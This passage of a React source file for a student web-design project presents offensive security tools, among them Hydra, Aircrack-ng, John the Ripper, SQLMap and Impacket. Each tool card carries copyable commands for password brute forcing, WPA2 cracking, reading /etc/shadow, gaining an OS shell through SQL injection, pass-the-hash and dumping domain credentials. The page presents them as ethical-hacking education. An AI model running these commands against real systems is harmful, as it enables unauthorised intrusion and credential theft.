hydra target.com http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`}
                          </pre>
                          <CopyButton text={`# 1. SSH brute force\nhydra -l admin -P pass.txt ssh://target\n\n# 2. FTP brute force\nhydra -L users.txt -P pass.txt ftp://target\n\n# 3. HTTP form login\nhydra target.com http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">2. Nmap <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">A network exploration tool and port scanner. Used to discover hosts, open ports, and running services on a network.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Intense scan (OS & services)
nmap -T4 -A -v <target>

# 2. Scan specific ports
nmap -p 80,443,8080 <target>

# 3. Use vulnerability scripts
nmap --script vuln <target>`}
                          </pre>
                          <CopyButton text={`# 1. Intense scan (OS & services)\nnmap -T4 -A -v <target>\n\n# 2. Scan specific ports\nnmap -p 80,443,8080 <target>\n\n# 3. Use vulnerability scripts\nnmap --script vuln <target>`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">3. Wireshark <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">A powerful network protocol analyzer. It allows hackers to capture and inspect live network traffic down to the packet level.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Start GUI (as root/sudo)
wireshark &

# 2. TShark CLI: Capture all on eth0
tshark -i eth0

# 3. Filter specific traffic
tshark -r cap.pcap -Y "http.request"`}
                          </pre>
                          <CopyButton text={`# 1. Start GUI (as root/sudo)\nwireshark &\n\n# 2. TShark CLI: Capture all on eth0\ntshark -i eth0\n\n# 3. Filter specific traffic\ntshark -r cap.pcap -Y "http.request"`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">4. Aircrack-ng <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">A suite of tools to assess WiFi network security. Hackers use it for monitoring, packet injection, and cracking WPA/WPA2 passwords.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Enable monitor mode
airmon-ng start wlan0

# 2. Capture packets (Handshake)
airodump-ng -c 6 --bssid 00:11... wlan0mon

# 3. Crack captured WPA2 hash
aircrack-ng -w wordlist.txt capture.cap`}
                          </pre>
                          <CopyButton text={`# 1. Enable monitor mode\nairmon-ng start wlan0\n\n# 2. Capture packets (Handshake)\nairodump-ng -c 6 --bssid 00:11... wlan0mon\n\n# 3. Crack captured WPA2 hash\naircrack-ng -w wordlist.txt capture.cap`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">5. John the Ripper <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">An extremely fast offline password cracker. Used to brute-force or dictionary-attack hashed passwords stolen from databases.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Combine passwd/shadow files
unshadow /etc/passwd /etc/shadow > hashes

# 2. Dictionary crack
john --wordlist=rockyou.txt hashes

# 3. Show cracked passwords
john --show hashes`}
                          </pre>
                          <CopyButton text={`# 1. Combine passwd/shadow files\nunshadow /etc/passwd /etc/shadow > hashes\n\n# 2. Dictionary crack\njohn --wordlist=rockyou.txt hashes\n\n# 3. Show cracked passwords\njohn --show hashes`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                    <div className="col-md-4">
                      <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
                        <strong className="text-danger d-block mb-1">6. Burp Suite <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                        <small className="text-secondary mb-3 flex-grow-1">An integrated platform for web application security testing. Its proxy intercepts HTTP traffic to manipulate requests before they reach the server.</small>
                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# 1. Start application
burpsuite &

# 2. Set browser proxy to:
# 127.0.0.1:8080

# 3. Intercept & send to Repeater
# (Done via GUI: Ctrl+R)`}
                          </pre>
                          <CopyButton text={`# 1. Start application\nburpsuite &\n\n# 2. Set browser proxy to:\n# 127.0.0.1:8080\n\n# 3. Intercept & send to Repeater\n# (Done via GUI: Ctrl+R)`} copiedText={copiedText} onCopy={handleCopy} />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'ethicalHacking' && (
        <section id="ethicalHacking" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-solid fa-user-ninja me-2"></i>Ethical Hacking - Tools of the traps</h2>
            
            <div className="row mb-5">
              <div className="col-12">
                <div className="cyber-card p-4 border-success" style={{ borderWidth: '2px' }}>
                  <h4 className="text-success mb-3"><i className="fa-solid fa-user-shield me-2"></i>What is Ethical Hacking?</h4>
                  <p className="text-secondary mb-2"><strong className="text-light">Authorized Probing:</strong> The legal practice of testing systems, networks, and applications to uncover vulnerabilities with explicit permission from the owner.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">White-Hat Philosophy:</strong> Operating as a "white-hat" hacker means using the same tools and methodologies as malicious actors, but for defensive purposes.</p>
                  <p className="text-secondary mb-2"><strong className="text-light">Vulnerability Mitigation:</strong> The primary goal is to identify security flaws before cybercriminals can exploit them, allowing organizations to patch weaknesses.</p>
                  <p className="text-secondary mb-0"><strong className="text-light">Protecting Data:</strong> Ethical hacking is a critical component of strengthening security postures and ensuring the confidentiality, integrity, and availability of sensitive information.</p>
                </div>
              </div>
            </div>

            <div className="row g-4">
              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-warning fa-2x mb-3"></i>
                  <h4 className="text-warning">SQLMap <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-warning">How it's used:</strong> Used to map databases, dump tables, and potentially take over database servers via SQL injection.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-warning border-opacity-25 mt-3">
                    <pre className="text-warning mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Basic SQL injection scan
sqlmap -u "http://target.com/page.php?id=1"

# Dump database tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# Get interactive OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell`}
                    </pre>
                    <CopyButton text={`# Basic SQL injection scan\nsqlmap -u "http://target.com/page.php?id=1"\n\n# Dump database tables\nsqlmap -u "http://target.com/page.php?id=1" --tables\n\n# Get interactive OS shell\nsqlmap -u "http://target.com/page.php?id=1" --os-shell`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-warning border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-warning font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('sqlmap')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-database text-warning me-1"></i>SQLi Engine
                    </span>
                  </div>
                </div>
              </div>

              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-info fa-2x mb-3"></i>
                  <h4 className="text-info">Scapy <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-info">What it is:</strong> A powerful interactive packet manipulation program and Python library.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-info">How it's used:</strong> Used to forge, decode, capture, and analyze packets of a wide number of network protocols.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-info border-opacity-25 mt-3">
                    <pre className="text-info mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Start interactive shell
scapy

# Send crafted ICMP ping
>>> send(IP(dst="192.168.1.1")/ICMP())

# Sniff 10 packets on eth0
>>> sniff(iface="eth0", count=10)`}
                    </pre>
                    <CopyButton text={`# Start interactive shell\nscapy\n\n# Send crafted ICMP ping\n>>> send(IP(dst="192.168.1.1")/ICMP())\n\n# Sniff 10 packets on eth0\n>>> sniff(iface="eth0", count=10)`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-info border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-info font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('scapy')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-network-wired text-info me-1"></i>Packet Forger
                    </span>
                  </div>
                </div>
              </div>

              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-danger fa-2x mb-3"></i>
                  <h4 className="text-danger">Impacket <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A collection of Python classes for working with network protocols.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-danger">How it's used:</strong> Frequently used by attackers for interacting with Windows domains, extracting hashes, and executing commands via Pass-the-Hash.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-danger border-opacity-25 mt-3">
                    <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Pass the Hash execution
psexec.py administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634

# Extract domain credentials
secretsdump.py domain.local/admin:password@192.168.1.10`}
                    </pre>
                    <CopyButton text={`# Pass the Hash execution\npsexec.py administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634\n\n# Extract domain credentials\nsecretsdump.py domain.local/admin:password@192.168.1.10`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-danger border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-danger font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('impacket')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-fingerprint text-danger me-1"></i>AD & SMB Suite
                    </span>
                  </div>
                </div>
              </div>

              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-success fa-2x mb-3"></i>
                  <h4 className="text-success">Dirsearch <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-success">What it is:</strong> A mature command-line tool designed to brute force directories and files in web servers.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-success">How it's used:</strong> Used by attackers during reconnaissance to map out hidden pathways, admin panels, and unlinked files on a web application.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-success border-opacity-25 mt-3">
                    <pre className="text-success mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Basic directory scan
python3 dirsearch.py -u "http://target.com"

# Scan with extensions
python3 dirsearch.py -u "http://target.com" -e php,html,txt

# Use custom wordlist
python3 dirsearch.py -u "http://target.com" -w /path/to/wordlist.txt`}
                    </pre>
                    <CopyButton text={`# Basic directory scan\npython3 dirsearch.py -u "http://target.com"\n\n# Scan with extensions\npython3 dirsearch.py -u "http://target.com" -e php,html,txt\n\n# Use custom wordlist\npython3 dirsearch.py -u "http://target.com" -w /path/to/wordlist.txt`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-success border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-success font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('dirsearch')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-folder-tree text-success me-1"></i>Path Bruter
                    </span>
                  </div>
                </div>
              </div>

              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-primary fa-2x mb-3"></i>
                  <h4 className="text-primary">WFuzz <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-primary">What it is:</strong> A highly configurable web application fuzzer.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-primary">How it's used:</strong> Used to find unlinked resources, hidden directories, or inject payloads into URL parameters and headers.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-primary border-opacity-25 mt-3">
                    <pre className="text-primary mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Fuzz URL directory
wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ

# Fuzz GET parameters
wfuzz -c -z file,params.txt http://target.com/index.php?FUZZ=1

# Fuzz POST data
wfuzz -c -z file,payloads.txt -d "user=admin&pass=FUZZ" http://target.com/login.php`}
                    </pre>
                    <CopyButton text={`# Fuzz URL directory\nwfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ\n\n# Fuzz GET parameters\nwfuzz -c -z file,params.txt http://target.com/index.php?FUZZ=1\n\n# Fuzz POST data\nwfuzz -c -z file,payloads.txt -d "user=admin&pass=FUZZ" http://target.com/login.php`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-primary border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-primary font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('wfuzz')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-vial text-primary me-1"></i>HTTP Fuzzer
                    </span>
                  </div>
                </div>
              </div>

              <div className="col-md-6 col-lg-4">
                <div className="cyber-card p-4 h-100 d-flex flex-column">
                  <i className="fa-brands fa-python text-light fa-2x mb-3"></i>
                  <h4 className="text-light">Responder <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
                  <p className="text-secondary"><strong className="text-light">What it is:</strong> A powerful LLMNR, NBT-NS and MDNS poisoner.</p>
                  <p className="text-secondary flex-grow-1"><strong className="text-light">How it's used:</strong> It answers to specific local network queries, tricking devices into sending it NTLM authentication hashes which can then be cracked.</p>
                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-light border-opacity-25 mt-3">
                    <pre className="text-light mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
{`# Start listening on eth0
python3 Responder.py -I eth0

# Run in analyze mode (no poisoning)
python3 Responder.py -I eth0 -A`}
                    </pre>
                    <CopyButton text={`# Start listening on eth0\npython3 Responder.py -I eth0\n\n# Run in analyze mode (no poisoning)\npython3 Responder.py -I eth0 -A`} copiedText={copiedText} onCopy={handleCopy} />
                  </div>

                  {/* Read More button at bottom of code */}
                  <div className="mt-3 pt-2 border-top border-light border-opacity-25 d-flex justify-content-between align-items-center">
                    <button
                      type="button"
                      className="btn btn-sm btn-outline-light font-monospace py-1 px-3 d-flex align-items-center gap-2"
                      onClick={() => openToolDetailPage('responder')}
                    >
                      <i className="fa-solid fa-book-open"></i>
                      <span>Read More</span>
                    </button>
                    <span className="text-secondary small font-monospace">
                      <i className="fa-solid fa-satellite text-light me-1"></i>LLMNR Poisoner
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      )}

      {currentView === 'toolDetail' && (
        <ToolDetailSection
          toolKey={selectedToolKey}
          onSelectTool={(key) => {
            setSelectedToolKey(key);
            window.location.hash = `tool-${key}`;
            window.scrollTo(0, 0);
          }}
          onBack={() => {
            setCurrentView('ethicalHacking');
            window.location.hash = 'ethicalHacking';
            window.scrollTo(0, 0);
          }}
          copiedText={copiedText}
          onCopy={handleCopy}
        />
      )}
        </motion.div>
      </AnimatePresence>

      <footer className="py-4 text-center text-secondary border-top border-dark">
        <div className="container">
          <p className="mb-2">&copy; 2026 ShadowGrid | Responsive Web Design (RWD) P2BL Project</p>
          <div className="d-flex justify-content-center gap-3">
            <a href="#about" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }} className="text-secondary text-decoration-none">About Team</a>
          </div>
        </div>
      </footer>
    </>
  );
}
